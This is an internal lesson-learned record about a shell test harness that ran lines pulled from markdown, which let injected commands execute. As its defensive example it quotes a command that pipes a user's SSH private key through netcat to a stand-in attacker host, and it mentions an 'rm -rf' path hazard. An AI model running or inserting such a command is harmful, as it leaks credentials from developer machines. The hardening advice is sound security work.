---
id: LESSON-619
title: "A harness that executes lines extracted from markdown is an execution surface — gate on a token allowlist, and never cite the lint as the control"
component: "adlc/partials"
domain: "adlc"
stack: ["sh", "markdown"]
concerns: ["security", "testing"]
tags: ["harness", "markdown-extraction", "execution-surface", "allowlist", "sandbox", "mktemp", "positive-control"]
req: REQ-610
created: 2026-09-02
updated: 2026-09-02
---

## What Happened

`partials/tests/source-guard.test.sh` was designed to prove that what is *actually
in the corpus* survives every shell: it extracts sourcing lines from `*/SKILL.md`,
`agents/*.md`, `proceed/phase*.md`, and `partials/*.sh`, writes each to a temp
script, and runs it under `$ADLC_TEST_SHELL` with `HOME` and cwd sandboxed. The
security reviewer showed the extraction gate was a prefix regex with an
unconstrained tail, so `[ -f .adlc/partials/forge.sh ] || nc attacker 443 < ~/.ssh/id_rsa`
extracted and ran — twelve times, with the developer's real uid, `PATH`, network,
and filesystem — and the new `unguarded-source` lint produced **zero** findings on
it, because the lint only sees dot-sources of convention paths. Markdown that
reviewers treat as inert prose had become an execution surface during the mandated
verify phase. The same pass found the sandbox root was never validated: an empty
`mktemp` result would have turned `rm -rf "$SANDBOX/a"` into `rm -rf /a`.

## Lesson

A line reaches a shell only if **every whitespace-separated token** is on an
allowlist of sourcing constructs (guard keywords, `.`, `source`, `sh`, the two
convention paths, `2>/dev/null`, list operators); anything else is a loud FAIL that
is never executed. Test the allowlist in both directions in the same run — the
canonical line must conform, a line with a foreign command must not (LESSON-602,
LESSON-440). Validate `mktemp`'s result before any `rm -rf` is derived from it,
using the full-path template (LESSON-441). And do not conflate the lint with the
harness's safety: a lint rule written to catch one shape says nothing about what
an extractor will hand to a shell.

## Why It Matters

Raw attacker capability is unchanged — a PR that can edit a SKILL.md can edit
`run.sh` — but the *class* of file that executes code changed, and that is what
review salience is built on. A harness that lets prose run under four shells on
every developer machine is a supply-chain foothold that looks like a test.

## Applies When

Any test, lint, or tool that extracts executable text from documentation, prompts,
or fixtures and runs it; any sandbox built from `mktemp` without checking the
result; any claim that "the lint would catch that" about content a different
component executes.
